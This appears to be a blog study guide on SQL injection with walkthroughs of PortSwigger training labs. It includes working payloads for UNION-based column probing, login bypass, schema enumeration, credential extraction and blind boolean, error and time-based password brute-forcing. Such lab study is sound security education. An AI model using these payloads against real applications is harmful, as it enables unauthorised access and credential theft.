---
layout: post
title: "SQL Injection - Complete Study Guide"
date: 2026-01-12
categories: [security, web-security, Portswigger]
tags: [sql-injection, sqli, union-attacks, blind-sqli]
---

# SQL Injection Study Guide

## Table of Contents
- [SQL Injection UNION Attacks](#sql-injection-union-attacks)
- [Blind SQL Injection](#blind-sql-injection)
- [Methodology](#methodology)
- [Lab Walkthroughs](#lab-walkthroughs)

---

## SQL Injection UNION Attacks

When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the `UNION` keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection UNION attack.

### Basic Syntax

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

### Requirements for UNION Queries

For a `UNION` query to work, two key requirements must be met:

1. The individual queries must return the same number of columns
2. The data types in each column must be compatible between the individual queries

### Preparing the Payload

You need to determine:
- How many columns are being returned from the original query
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query

#### Method 1: ORDER BY

The column in an `ORDER BY` clause can be specified by its index, so you don't need to know the names of any columns.

```sql
SELECT * FROM Customers ORDER BY CustomerName;
SELECT * FROM Customers ORDER BY 1;
```

**Testing payloads:**

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

When the specified column index exceeds the number of actual columns in the result set, the database returns an error:

```
The ORDER BY position number 3 is out of range of the number of items in the select list.
```

#### Method 2: UNION SELECT NULL

We use `NULL` as the values returned from the injected `SELECT` query because the data types in each column must be compatible between the original and the injected queries. `NULL` is convertible to every common data type.

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

If the number of nulls does not match the number of columns, the database returns an error:

```
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```

### Finding Columns with Useful Data Types

After you determine the number of required columns, you can probe each column to test whether it can hold string data. Submit a series of `UNION SELECT` payloads that place a string value into each column in turn:

```sql
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

If the column data type is not compatible with string data, the injected query will cause a database error.

---

## Blind SQL Injection

Blind SQL injection means that the result of the query is not returned in the response.

### Techniques to Detect Blind SQLi

1. **Boolean-based:** Change the logic of the query to trigger a detectable difference in the application's response depending on the truth of a single condition
2. **Error-based:** Conditionally trigger an error such as a divide-by-zero
3. **Time-based:** Conditionally trigger a time delay in the processing of the query
4. **Out-of-band:** Trigger an out-of-band network interaction using OAST techniques

---

## Methodology

### Testing Flow

```
Start Testing
    ↓
Basic Syntax Breaking (add quotes)
    ↓
Any Response Change?
    ├─ No → Try Time-Based
    └─ Yes → Characterize Change
              ├─ Returns Data? → UNION Testing → Extract Schema
              └─ Shows Errors? 
                  ├─ Yes → Error-Based → Extract Schema
                  └─ No → Boolean Blind → Extract Schema
```

### Initial Testing Checklist

Try adding these and notice any differences:

```sql
# 1. Baseline Establishment
'       → Check for syntax error
"       → Sometimes they use double quotes
\'      → Escaped quote test
\       → Escape character test

# 2. Quick Boolean Tests
1 AND 1=1           → Should return same as 1
1 AND 1=2           → Should return different/empty
1' AND '1'='1       → String context version
1' AND '1'='2
```

---

## Lab Walkthroughs

### Generic Labs

#### Lab 1: Retrieving Hidden Data

**Objective:** Reveal hidden products by manipulating the category filter.

**Solution:**

Original query:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Injected query:
```sql
SELECT * FROM products WHERE category = 'Gifts' OR '1'='1'--' AND released = 1
```

**Payload:**
```
GET /filter?category=Gifts' OR '1'='1'--
```

![Retrieving_hidden_data.png](/assets/Images/sqli/Retrieving_hidden_data.png)

---

#### Lab 2: Subverting Application Logic

**Objective:** Log in as the administrator user without knowing the password.

**Solution:**

Normal SQL query:
```sql
SELECT * FROM users WHERE username = 'administrator' AND password = ''
```

Injected query:
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

**Payload:**
```
username: administrator'--
password: [anything]
```

![image.png](/assets/Images/sqli/image.png)

---

### SQL Injection UNION Attack Labs

#### Lab 3: Determining the Number of Columns

**Objective:** Determine how many columns are returned by the query.

**Solution:**

Original query:
```sql
SELECT * FROM PRODUCTS WHERE category='Lifestyle'
```

Injected query:
```sql
SELECT * FROM PRODUCTS WHERE category='Lifestyle' UNION SELECT NULL,NULL,NULL--
```

**Request:**

```http
# Normal Request
GET /filter?category=Lifestyle HTTP/2
Host: 0ac800b003fb4fb882739266006a00f4.web-security-academy.net
Cookie: session=bJcZtXfkflDyGSn2mq1CTU2x1IC4ducD

# Injected request
GET /filter?category=Lifestyle' UNION SELECT NULL,NULL,NULL-- HTTP/2
Host: 0ac800b003fb4fb882739266006a00f4.web-security-academy.net
```

Keep adding NULLs until you get a 200 OK response.

---

#### Lab 4: Finding a Column Containing Text

**Objective:** Identify which column accepts string data and return a specific string.

**Solution:**

Opening network tab and clicking on any category. First we need to determine the number of columns, so right-click on the 200 request, edit and resend.

![Lab3-1.PNG](/assets/Images/sqli/Lab3-1.png)

We keep adding NULLs until we reach an error:

![lab3-2.PNG](/assets/Images/sqli/lab3-2.png)

Now that we know the number of columns are 3, we want to retrieve a specific string. To do so, we need to know which column gives us a string data type back from the query.

![lab3-3.PNG](/assets/Images/sqli/lab3-3.png)

Adding 'a' instead of NULL - when it's the wrong data type it will give you an error.

![lab4.PNG](/assets/Images/sqli/lab4.png)

Eventually the second column is compatible.

---

#### Lab 5: Retrieving Interesting Data

**Objective:** Retrieve all usernames and passwords from the users table.

**Solution:**

Given in the topic of the lab, the query:

```sql
' UNION SELECT username, password FROM users--
```

We inject it:

![image.png](/assets/Images/sqli/image%201.png)

And we find credentials printed in the response:

![image.png](/assets/Images/sqli/image%202.png)

---

#### Lab 6: Retrieving Multiple Values in a Single Column

**Objective:** Extract username and password when only one column can hold strings.

**Solution:**

First we start by adding a single quote to the query and notice the server error. Then we start investigating how many columns the original query returns and it returns two columns:

![image.png](/assets/Images/sqli/image%203.png)

And we also know that the second one is returning a string:

![image.png](/assets/Images/sqli/image%204.png)

So now that we know the second column holds a string value, doing this returns the usernames in database:

![image.png](/assets/Images/sqli/image%205.png)

Now if we try these payloads:

```sql
' UNION SELECT username,password FROM users-- # fails because the second column is the one that's returning a string value
' UNION SELECT password,username FROM users-- # also fails
```

So now that we know that the query only returns one column, we can concatenate the second one that we want in the same query like this:

```sql
' UNION SELECT username || '~' || password FROM users--
```

But don't forget that we have to make it like we are querying two columns as the original query:

```sql
Gifts' UNION SELECT NULL, username || '~' || password FROM users--
```

Doing so will return the query printed in the response:

![image.png](/assets/Images/sqli/image%206.png)

---

#### Lab 7: Database Version on MySQL

**Objective:** Display the database version string for MySQL.

**Solution:**

Inserting single quote returns error, 2 single quotes closing the query is valid.

![image.png](/assets/Images/sqli/image%207.png)

Now notice when doing this MySQL query it returns 200 meaning that this is a MySQL database.

![image.png](/assets/Images/sqli/image%208.png)

Knowing how many columns:

![image.png](/assets/Images/sqli/image%209.png)

This will solve the lab:

![image.png](/assets/Images/sqli/image%2010.png)

---

#### Lab 8: Database Version on Oracle

**Objective:** Display the database version string for Oracle.

**Solution:**

This confirms it's an Oracle database:

![image.png](/assets/Images/sqli/image%2011.png)

Two columns, both are strings:

![image.png](/assets/Images/sqli/image%2012.png)

![image.png](/assets/Images/sqli/image%2013.png)

---

#### Lab 9: Listing Database Contents (Non-Oracle)

**Objective:** Find and extract the users table and its contents.

**Solution:**

Knowing it's a non-Oracle database, starting with normal break single quote:

![image.png](/assets/Images/sqli/image%2014.png)

This confirms it's a MySQL database:

![image.png](/assets/Images/sqli/image%2015.png)

Now we get that it's two columns and the second one is string returned by the original query:

![image.png](/assets/Images/sqli/image%2016.png)

Ok now that we know there are two columns, and the first one is a string our payload would look like this:

```sql
'UNION SELECT table_name,NULL FROM information_schema.tables-- 
# don't forget the whitespace after the --comment
```

![image.png](/assets/Images/sqli/image%2017.png)

It will bring a lot of tables and we notice there's an interesting users one, played with its name so we cannot guess that the table name is 'users' (users_ljrgqq).

So we will have to list the content of that table but we don't know the column names so we try to retrieve those by using this payload:

```sql
'UNION SELECT column_name,NULL FROM information_schema.columns where table_name='users_ljrgqq'--
```

![image.png](/assets/Images/sqli/image%2018.png)

Now we can retrieve the username and password:

![image.png](/assets/Images/sqli/image%2019.png)

---

#### Lab 10: Listing Database Contents (Oracle)

**Objective:** Find and extract the users table on Oracle database.

**Solution:**

Confirms it's an Oracle DB and know that it returns two columns with string values:

![image.png](/assets/Images/sqli/image%2020.png)

Retrieving table name:

![image.png](/assets/Images/sqli/image%2021.png)

This will return column names:

![image.png](/assets/Images/sqli/image%2022.png)

![image.png](/assets/Images/sqli/image%2023.png)

---

### Blind SQL Injection Labs

#### Lab 11: Blind SQLi with Conditional Responses

**Objective:** Extract the administrator password using conditional responses.

**Scenario:** The application displays "Welcome back" when a query returns results.

**Solution:**

The normal query returns 200 OK and the 'welcome back string':

![image.png](/assets/Images/sqli/image%2036.png)

When injecting a single quote:

![Screenshot_1.png](/assets/Images/sqli/Screenshot_1.png)

No 'welcome' string and the length of the response changed. We could verify SQLi by adding ' OR '1' = '1'--

![image.png](/assets/Images/sqli/image%2037.png)

Here we see that injecting UNION query does not return anything:

![image.png](/assets/Images/sqli/image%2038.png)

So, we could say that we are dealing with blind SQLi. Knowing so, as said in the lab topic you could "enumerate" the administrator password by triggering conditional responses, knowing that the TRUE or a valid query returns the 'welcome string' as well as the length differs from the original one.

Injecting the following query:

```sql
' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'administrator'), 1, 1) = 'a
```

The SUBSTRING() function extracts a portion of a character or binary expression based on a specified starting position and length.

| Example | Query | Result |
|---------|-------|--------|
| Extract the first 3 characters | `SELECT SUBSTRING('SQL Tutorial', 1, 3);` | `'SQL'` |
| Extract from a specific position to the end | `SELECT SUBSTRING('abcdef', 4);` | `'def'` |
| Extract a specific part of a column | `SELECT SUBSTRING(Email, 1, 5) FROM Users;` | First 5 characters of the email |

Changing characters instead of 'a' will return the 'welcome' string. Other characters won't. This query means:
- 1st part: select the user who has the Tracking-ID = "bla-bla-bla"
- 2nd part: select the password of the user admin
- 3rd part: starting from first position, count only one character
- 4th part: is that equal to 'a'?

And why we didn't close the injected query with single quote? Because the original query will.

Now, we have to brute-force:

![image.png](/assets/Images/sqli/image%2039.png)

---

#### Lab 12: Blind SQLi with Conditional Errors

**Objective:** Use error-based blind SQLi to extract the administrator password.

**Solution:**

Normal GET and response:

![image.png](/assets/Images/sqli/image%2024.png)

Adding single quote results in 500 internal server error. This means that the target is likely vulnerable:

![image.png](/assets/Images/sqli/image%2025.png)

Now we test for boolean and look if the query evaluates to true, this means that the target is vulnerable to SQLi:

![image.png](/assets/Images/sqli/image%2026.png)

Given that we have a table users that contains username and password. Trying some union attacks nothing seems to be reflected or behavioral difference. Trying this payload to trigger a 200 OK doesn't work:

```sql
xyz'AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
```

So, trying different syntax for different DBMS and seems like Oracle is working:

![image.png](/assets/Images/sqli/image%2027.png)

Change that 2 to 1 it will throw an error. The syntax is:
- When (1=1) which is true, so when (true) do the part "Then to char (1/0) which is simply divide by zero which causes an error
- When (1=2) which is false, so it will skip the division part and simply returns 'a'
- The last part simply compares. In the first scenario it will throw an error 500. In the second the query is correct.

After some time trying to craft the payload this one worked (you will take some time with the syntax) and use your previous labs payloads:

```sql
' AND (SELECT CASE WHEN (SUBSTR((SELECT Password FROM users WHERE username = 'administrator'), 1, 1) = 'a') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
```

![image.png](/assets/Images/sqli/image%2028.png)

Now we will have to brute force like the previous lab, but instead you will have to look for errors for the correct answer.

To test, we found the first character:

![image.png](/assets/Images/sqli/image%2029.png)

---

#### Lab 13: Verbose SQL Error Messages

**Objective:** Extract sensitive data from verbose error messages.

**Solution:**

Normal query:

![image.png](/assets/Images/sqli/image%2030.png)

Breaking it using a single quote:

![image.png](/assets/Images/sqli/image%2031.png)

Now that we know what query is being executed:

```sql
SELECT * FROM tracking WHERE id = 'Yt8iC8zSy2hWehP4'
SELECT * FROM tracking WHERE id = 'Yt8iC8zSy2hWehP4' UNION SELECT * FROM users where username="administrator"--
```

Trying to return any data in the response:

![image.png](/assets/Images/sqli/image%2032.png)

Now that we know UNION boolean is working we try to see how many columns and it seems to be that the original query is returning only one:

![image.png](/assets/Images/sqli/image%2033.png)

So this doesn't seem to be working at all. The query stops at 'use no matter how I tried to bypass this:

![image.png](/assets/Images/sqli/image%2034.png)

Now this seems to be working, however after a little bit of searching I discovered that the database is PostgreSQL not MySQL:

![image.png](/assets/Images/sqli/image%2035.png)

---

#### Lab 14: Time Delays and Information Retrieval

**Objective:** Use time-based blind SQLi to extract the administrator password.

**Solution:**

Tried some payloads for time delays to determine the database and this worked so it confirms that this is PostgreSQL:

![image.png](/assets/Images/sqli/image%2040.png)

Given the info in the lab, we have administrator account and we have the column names so we hunt directly for password. First we need to determine the password length:

![image.png](/assets/Images/sqli/image%2041.png)

Now we need to brute-force:

![image.png](/assets/Images/sqli/image%2042.png)

---

## Database-Specific Syntax Reference

### MySQL/Microsoft SQL Server
```sql
@@version                    -- Get version
' AND 1=1--                 -- Comment
SUBSTRING(string, pos, len) -- Extract substring
CONCAT(str1, str2)          -- Concatenate strings
```

### Oracle
```sql
SELECT banner FROM v$version  -- Get version
' AND 1=1--                  -- Comment
FROM dual                    -- Required for SELECT
SUBSTR(string, pos, len)     -- Extract substring
string1 || string2           -- Concatenate strings
```

### PostgreSQL
```sql
version()                    -- Get version
' AND 1=1--                 -- Comment
SUBSTRING(string, pos, len) -- Extract substring
string1 || string2          -- Concatenate strings
pg_sleep(seconds)           -- Time delay
```

---

## Key Takeaways

1. Always start with basic syntax testing (quotes, comments)
2. Determine the number of columns before attempting UNION attacks
3. Identify which columns accept string data
4. For blind SQLi, use boolean, error-based, or time-based techniques
5. Database-specific syntax matters - test to identify the DBMS
6. Concatenation syntax varies by database
7. Always URL-encode special characters in actual attacks
8. Use automated tools (like Burp Intruder) for brute-forcing

---

## Additional Resources

- [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)

---

*Last updated: January 12, 2026*